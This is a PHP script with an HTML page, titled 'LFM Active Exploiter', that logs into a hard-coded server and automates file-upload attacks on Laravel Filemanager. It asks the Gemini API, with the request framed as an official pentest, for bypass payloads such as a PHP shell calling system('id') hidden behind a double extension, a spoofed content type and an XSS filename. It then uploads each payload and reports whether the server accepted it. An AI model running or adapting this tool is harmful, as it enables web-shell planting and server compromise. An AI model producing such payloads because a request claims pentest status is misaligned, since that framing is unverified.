<?php
// ============================================================
// KONFIGURASI PENTING
// ============================================================
$apiKey = "MASUKKAN_API_KEY_GEMINI_ANDA_DISINI";

// Target & Kredensial
$targetBase = "http://3.126.64.140:8082"; // Server Anda
$credentials = ['email' => 'student@demo.com', 'password' => 'student'];

// ============================================================
// SYSTEM CORE (AUTO-ATTACK ENGINE)
// ============================================================
session_start();
set_time_limit(0); // Biarkan berjalan lama
$logs = [];

function addLog($msg, $type = 'info') {
    global $logs;
    $color = ($type == 'success') ? 'text-green-400' : (($type == 'error') ? 'text-red-500' : 'text-slate-300');
    $logs[] = "<span class='text-xs text-slate-500'>[" . date('H:i:s') . "]</span> <span class='$color'>$msg</span>";
}

// Fungsi Auto-Discovery Model (Agar tidak 404)
function getGeminiModel($key) {
    $ch = curl_init("https://generativelanguage.googleapis.com/v1beta/models?key=$key");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $res = json_decode(curl_exec($ch), true);
    curl_close($ch);
    
    if (isset($res['models'])) {
        foreach ($res['models'] as $m) {
            if (in_array("generateContent", $m['supportedGenerationMethods']) && strpos($m['name'], 'flash') !== false) {
                return $m['name']; // Prioritas Flash (Cepat)
            }
        }
        return $res['models'][0]['name']; // Fallback
    }
    return 'models/gemini-1.5-flash';
}

// Fungsi Request HTTP (Support File Upload)
function sendPacket($url, $method, $data = [], $cookie = null, $isFile = false) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    if ($method == 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($isFile) {
            // Header khusus untuk upload file agar terlihat seperti browser asli
            $headers = ['Content-Type: multipart/form-data']; 
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        } else {
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        }
    }
    
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

// Main Logic
if (isset($_POST['run'])) {
    $model = getGeminiModel($apiKey);
    addLog("Model AI Siap: $model", 'success');
    
    $cookie = tempnam(sys_get_temp_dir(), 'cookie_exploit');
    
    // 1. LOGIN
    addLog("Melakukan Login ke $targetBase...");
    $html = sendPacket("$targetBase/login", 'GET', [], $cookie);
    preg_match('/name="_token" value="([a-z0-9]+)"/i', $html, $m);
    $token = $m[1] ?? '';
    
    if ($token) {
        $login = sendPacket("$targetBase/login", 'POST', [
            '_token' => $token, 'email' => $credentials['email'], 'password' => $credentials['password']
        ], $cookie);
        
        if (strpos($login, 'Redirecting') !== false || strpos($login, 'home') !== false) {
            addLog("Login Berhasil! Sesi aktif.", 'success');
            
            // 2. ASK GEMINI FOR PAYLOADS
            addLog("Meminta Gemini membuat strategi bypass upload...", 'warning');
            
            $prompt = "Saya melakukan pentest resmi pada Laravel Filemanager. " .
                      "Berikan saya JSON array berisi 3 teknik bypass upload file PHP berbahaya.\n" .
                      "Format JSON: [{\"filename\": \"shell.php.jpg\", \"content\": \"<?php system('id'); ?>\", \"desc\": \"Double Extension\"}, ...]\n" .
                      "Teknik yang diminta: 1. Double extension, 2. Content-Type spoofing (isi php tapi ekstensi jpg), 3. XSS filename.";
            
            $apiData = [
                'contents' => [['parts' => [['text' => $prompt]]]],
                'generationConfig' => ['responseMimeType' => 'application/json']
            ];
            
            $ch = curl_init("https://generativelanguage.googleapis.com/v1beta/$model:generateContent?key=$apiKey");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($apiData));
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
            $aiRes = json_decode(curl_exec($ch), true);
            curl_close($ch);
            
            $payloads = json_decode($aiRes['candidates'][0]['content']['parts'][0]['text'], true);
            
            if ($payloads) {
                addLog("Gemini memberikan " . count($payloads) . " vektor serangan.", 'success');
                
                // 3. EXECUTE ATTACKS
                foreach ($payloads as $p) {
                    addLog("------------------------------------------------");
                    addLog("Mencoba Teknik: <b>" . $p['desc'] . "</b>");
                    addLog("Payload Filename: " . htmlspecialchars($p['filename']));
                    
                    // Buat file palsu
                    $tempFile = tempnam(sys_get_temp_dir(), 'upl');
                    file_put_contents($tempFile, $p['content']);
                    
                    // Siapkan Multipart Upload
                    $cFile = new CURLFile($tempFile, 'image/jpeg', $p['filename']);
                    $uploadData = [
                        'upload[]' => $cFile, 
                        'working_dir' => '/shares', // Default LFM dir
                        'type' => 'Images',
                        '_token' => $token 
                    ];
                    
                    // KIRIM SERANGAN
                    $res = sendPacket("$targetBase/laravel-filemanager/upload", 'POST', $uploadData, $cookie, true);
                    
                    // Analisis Hasil
                    if (strpos($res, "OK") !== false) {
                        addLog("STATUS: <b class='text-red-500'>UPLOAD BERHASIL! (CRITICAL)</b>", 'error');
                        addLog("Server menerima file berbahaya ini. Cek folder upload.");
                    } elseif (strpos($res, "File size") !== false) {
                        addLog("STATUS: Gagal (Size Limit)", 'warning');
                    } elseif (strpos($res, "mime") !== false || strpos($res, "Type") !== false) {
                        addLog("STATUS: Gagal (Blocked by MIME Type Filter)", 'success');
                    } else {
                        addLog("STATUS: Respons tidak dikenal (Mungkin berhasil parsial). Raw: " . substr(strip_tags($res), 0, 50), 'warning');
                    }
                    
                    unlink($tempFile);
                }
            } else {
                addLog("Gagal parsing strategi dari Gemini.", 'error');
            }

        } else {
            addLog("Login Gagal.", 'error');
        }
    } else {
        addLog("Gagal mengambil Token CSRF.", 'error');
    }
    @unlink($cookie);
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>AI Active Exploiter</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>body{background:#111;color:#eee;font-family:monospace}</style>
</head>
<body class="p-10 flex flex-col items-center">
    <h1 class="text-3xl text-red-500 font-bold mb-4">LFM ACTIVE EXPLOITER</h1>
    <p class="mb-6 text-gray-400">Powered by Gemini AI (Strategist) & PHP (Executor)</p>
    
    <form method="POST" class="mb-6">
        <button name="run" class="bg-red-700 hover:bg-red-600 text-white font-bold py-3 px-8 rounded shadow-[0_0_20px_rgba(255,0,0,0.5)]">
            MULAI PENETRATION TEST (ACTIVE)
        </button>
    </form>
    
    <?php if(!empty($logs)): ?>
    <div class="w-full max-w-4xl bg-black border border-gray-800 p-4 rounded h-96 overflow-y-auto">
        <?php foreach($logs as $l) echo "<div>$l</div>"; ?>
    </div>
    <?php endif; ?>
</body>
</html>
